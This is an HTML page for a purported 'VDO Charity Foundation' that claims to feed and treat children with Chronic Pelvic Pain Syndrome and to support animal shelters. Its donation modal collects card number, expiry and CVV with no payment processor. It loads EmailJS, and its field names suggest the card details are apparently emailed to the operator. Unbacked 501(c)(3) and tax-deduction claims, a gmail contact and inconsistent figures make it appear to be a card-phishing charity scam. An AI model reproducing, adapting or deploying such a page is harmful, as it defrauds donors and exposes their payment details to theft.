<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VDO Charity Foundation | Caring for Kids with Chronic Pelvic Pain & Animals</title>
    <link rel="stylesheet" href="styles.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
</head>

<body>
    <!-- Header -->
    <header>
        <nav class="container">
            <img src="LOGO.png" alt="VDO Charity Foundation Logo" class="logo">
            <ul class="nav-links">
                <li><a href="#home">Home‬</a></li>
                <li><a href="#about">About</a></li>
                <li><a href="#impact">Impact</a></li>
                <li><a href="#donate">Donate</a></li>
            </ul>
            <a href="#donate" class="nav-cta" onclick="openPaymentModal(0);return false;"><i class="fas fa-heart"></i>
                Donate Now</a>
            <div class="hamburger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </nav>
    </header>

    <!-- Hero -->
    <section id="home" class="hero">
        <div class="hero-content">
            VDO<br>Charity Foundation
            <p>Caring for over 500 children with Chronic Pelvic Pain Syndrome - feeding, medication, shelter, and
                well-being. Also supporting animal shelters. Your donation saves lives.</p>
            <a href="#donate" class="cta-button animate" style="animation-delay: 0.2s;"><i class="fas fa-heart"></i>
                Donate Now</a>
        </div>
    </section>

    <!-- Stats -->
    <section class="stats container">
        <div class="stat animate">
            <i class="fas fa-dollar-sign"></i>
            <h3 data-target="25000000">$2M</h3>
            <p>Raised for Care</p>
        </div>
        <div class="stat animate">
            <i class="fas fa-child"></i>
            <h3 data-target="500">287</h3>
            <p>Kids with CPPS Helped</p>
        </div>
        <div class="stat animate">
            <i class="fas fa-paw"></i>
            <h3 data-target="2000">1245</h3>
            <p>Animals Sheltered</p>
        </div>
        <div class="stat animate">
            <i class="fas fa-check-circle"></i>
            <h3>100%</h3>
            <p>Tax Deductible</p>
        </div>
    </section>

    <!-- About -->
    <section id="about" class="about">
        <div class="container">
            <h2 class="section-title animate">Our Mission</h2>
            <div class="about-grid">
                <div class="about-text">
                    <h3>Caring for Innocent Children</h3>
                    <p>VDO Charity Foundation is dedicated to caring for over 500 children suffering from

                        Chronic Pelvic Pain Syndrome. We provide feeding, medication, shelter, and comprehensive
                        well-being support.</p>
                    <p>Additionally, we support animal shelters to rescue and care for abandoned animals. Every donation
                        directly impacts these innocent lives.</p>
                    <a href="#donate" class="cta-button"><i class="fas fa-hands-helping"></i> Support Our Cause</a>
                </div>
                <img src="OUR MISSION'.png" alt="Children receiving care"
                    onerror="this.src='https://images.unsplash.com/photo-1524504388942-b6e9e6a91a1f?w=800&fit=crop';">
            </div>
        </div>
    </section>

    <!-- Impact -->
    <section id="impact" class="impact">
        <div class="container">
            <h2 class="section-title animate">Our Impact</h2>
            <div class="impact-grid">
                <div class="impact-card animate">
                    <i class="fas fa-pills"></i>
                    <h3>Medical Care</h3>
                    <p>Providing life-saving medication and treatments for children with Chronic Pelvic Pain Syndrome.
                    </p>
                </div>
                <div class="impact-card animate">
                    <i class="fas fa-utensils"></i>
                    <h3>Daily Feeding</h3>
                    <p>Nutritious meals for 500+ children every day, ensuring proper growth and health.</p>
                </div>
                <div class="impact-card animate">
                    <i class="fas fa-home"></i>
                    <h3>Safe Shelter</h3>
                    <p>Secure housing and safe environments for children and rescued animals.</p>
                </div>
                <div class="impact-card animate">
                    <i class="fas fa-paw"></i>
                    <h3>Animal Rescue</h3>
                    <p>Supporting animal shelters - veterinary care, food, and adoption programs.</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Donation -->
    <section id="donate" class="donation">
        <div class="container">
            <h2 class="section-title animate">Make a Difference Today</h2>
            <p class="animate"
                style="font-size: 1.3rem; margin-bottom: 3rem; max-width: 600px; margin-left: auto; margin-right: auto;">
                Your donation provides medication, food, shelter for children with CPPS and helps animal shelters. 100%
                tax-deductible - every dollar counts.
            </p>
            <div class="donation-grid animate">
                <button class="donate-btn" data-amount="25">$25</button>
                <button class="donate-btn" data-amount="50">$50</button>
                <button class="donate-btn" data-amount="100">$100</button>
                <button class="donate-btn" data-amount="250">$250</button>
                <button class="donate-btn" data-amount="500">$500</button>
                <button class="donate-btn" data-amount="1000">$1000+</button>
            </div>
            <div style="margin-top: 2rem;">
                <input type="number" id="custom-amount" placeholder="Custom Amount" min="1">
                <button onclick="handleCustomDonate()" class="cta-button"
                    style="margin-top: 1rem; display: inline-block;"><i class="fas fa-credit-card"></i> Donate
                    Custom</button>
            </div>
            <p style="margin-top: 2rem; opacity: 0.8;">Secure 256-bit SSL | 501(c)(3) Nonprofit | Processing fees
                covered</p>
        </div>
    </section>

    <!-- Footer -->
    <footer>
        <div class="container">
            <img src="LOGO.png" alt="VDO Charity Foundation Logo" class="logo"
                style="height: 40px; margin-bottom: 1rem;">

            <div class="trust-badges">
                <i class="fas fa-shield-alt"></i>
                <i class="fas fa-lock"></i>
                <i class="fas fa-file-invoice-dollar"></i>
                <i class="fas fa-heart"></i>
            </div>
            <div class="footer-content">
                <p>© 2024 VDO Charity Foundation. All rights reserved. <strong>100% Tax
                        Deductible</strong></p>
                <p>Contact: +1 (828) 3786721 | <a href="mailto:onofriovincent07@gmail.com"
                        style="color: #ff6b35;">onofriovincent07@gmail.com</a></p>
            </div>



            <div class="social-links">
                <a href="#"><i class="fab fa-facebook"></i></a>
                <a href="#"><i class="fab fa-twitter"></i></a>
                <a href="#"><i class="fab fa-instagram"></i></a>
                <a href="#"><i class="fab fa-youtube"></i></a>
            </div>
        </div>
    </footer>

    <!-- Payment Modal - CLEANED: Removed unnecessary hidden fields -->
    <div id="paymentModal" class="modal">
        <div class="modal-content">
            <span class="modal-close">×</span>
            <h2><i class="fas fa-credit-card"></i> Secure Payment</h2>
            <form id="paymentForm">
                <input type="hidden" name="amount" id="modalAmount">

                <div class="form-group">
                    <label>Full Name</label>
                    <input type="text" name="from_name" required>
                </div>
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" name="from_email" required>
                </div>
                <div class="form-group">
                    <label>Card Number</label>
                    <input type="text" name="card_number" placeholder="1234 5678 9012 3456" required>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>Expiry (MM/YY)</label>
                        <input type="text" name="exp_date" placeholder="MM/YY" required>
                    </div>
                    <div class="form-group">
                        <label>CVV</label>
                        <input type="text" name="cvv" placeholder="123" maxlength="4" required>
                    </div>
                </div>
                <button type="submit" class="submit-btn">Proceed to Payment <i class="fas fa-lock"></i></button>
            </form>
            <p class="secure-note">🔒 Secure 256-bit SSL | No card charged yet - confirmation sent to email</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>

</html>
